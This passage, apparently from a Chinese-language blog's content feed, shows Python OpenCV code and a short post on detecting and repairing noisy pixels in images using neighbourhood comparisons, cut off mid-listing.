<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i]) - <span class="built_in">int</span>(p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">0</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span>] += half_channel[<span class="number">0</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">1</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">1</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">2</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span>] += half_channel[<span class="number">2</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">3</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">3</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    <span class="comment"># half_b = [half_1(b), half_2(b), half_3(b), half_4(b)]</span></span><br><span class="line">    <span class="comment"># half_g = [half_1(g), half_2(g), half_3(g), half_4(g)]</span></span><br><span class="line">    <span class="comment"># half_r = [half_1(r), half_2(r), half_3(r), half_4(r)]</span></span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.noise.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.noise[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.pixel.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.channel[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span></span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210516</title>
      <link href="/20210516-img-report/"/>
      <url>/20210516-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>尝试使用新的划分方法查找噪声点</p><p>并将噪声点像素值标记为0（对单通道而言）</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011559810.png" alt="1" style="zoom: 200%;" /><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.找出噪声点：</span></span><br><span class="line"><span class="string">    新划分方法</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">2.修改</span></span><br><span class="line"><span class="string">    修改为0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 特殊值处理</span></span><br><span class="line"><span class="string">def special_check(_8area):</span></span><br><span class="line"><span class="string">    p = [_8area[0][0], _8area[0][1], _8area[0][2], _8area[1][2],</span></span><br><span class="line"><span class="string">         _8area[2][2], _8area[2][1], _8area[2][0], _8area[1][0]]</span></span><br><span class="line"><span class="string">    p_sum = int(p[0]) + int(p[1]) + int(p[2]) + int(p[3]) + int(p[4]) + int(p[5]) + int(p[6]) + int(p[7])</span></span><br><span class="line"><span class="string">    max_differ = 0</span></span><br><span class="line"><span class="string">    max_index = 0</span></span><br><span class="line"><span class="string">    for i in range(8):</span></span><br><span class="line"><span class="string">        if abs(int(p[i]) - (p_sum - int(p[i])) // 7) &gt; max_differ:</span></span><br><span class="line"><span class="string">            max_differ = abs(int(p[i]) - (p_sum - int(p[i])) // 7)</span></span><br><span class="line"><span class="string">            max_index = i</span></span><br><span class="line"><span class="string">    if max_differ &gt; 4:</span></span><br><span class="line"><span class="string">        return _1d_2_2d(max_index)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return -1, -1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除del_num号元素，del_num:0~7</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area, del_num</span>):</span></span><br><span class="line">    r = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> i == del_num:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p2.append(p1[i])</span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    p = <span class="built_in">sorted</span>(p2)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    result[del_num] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 如果在不去除点的情况下，不需要划分，那么就跳过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> flag1:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            part2 = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">                cnt = <span class="number">0</span></span><br><span class="line">                part2, flag2 = division2(_8_area, k)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> flag2:</span><br><span class="line">                    <span class="keyword">if</span> k == <span class="number">0</span> <span class="keyword">or</span> k == <span class="number">7</span>:</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 比较</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> part2[m] != <span class="number">0</span> <span class="keyword">and</span> part1[m] != part2[m]:</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> cnt &gt;= <span class="number">1</span>:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span 